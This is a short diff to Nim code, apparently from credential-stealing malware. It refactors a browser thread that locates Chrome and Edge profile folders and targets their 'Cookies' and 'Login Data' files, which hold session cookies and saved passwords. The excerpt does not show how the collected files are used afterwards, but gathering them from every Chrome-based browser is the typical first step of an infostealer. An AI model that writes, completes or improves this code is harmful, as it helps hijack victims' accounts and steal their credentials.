@@ -41,11 +41,13 @@ proc initBrowserThread*(): void {.thread.} =
     (
       CHROME_BASED,
       @[
-        r"Google\Chrome\User Data\Default",
-        r"Microsoft\Edge\User Data\Default",
+        r"Google\Chrome",
+        r"Microsoft\Edge",
       ]
     )
   ]
+
+  var localappdata: string = ""
 
   for browser in browsers:
     for folder in browser.folders:
@@ -54,7 +56,9 @@ proc initBrowserThread*(): void {.thread.} =
         files: seq[string]
 
       if browser.based == CHROME_BASED:
-        fullFolder = getEnv("localappdata") / folder
+        if localappdata == "":
+          localappdata = getEnv("localappdata")
+        fullFolder = localappdata / folder / r"User Data\Default"
         files = @["Cookies", "Login Data"]
 
       for file in files:
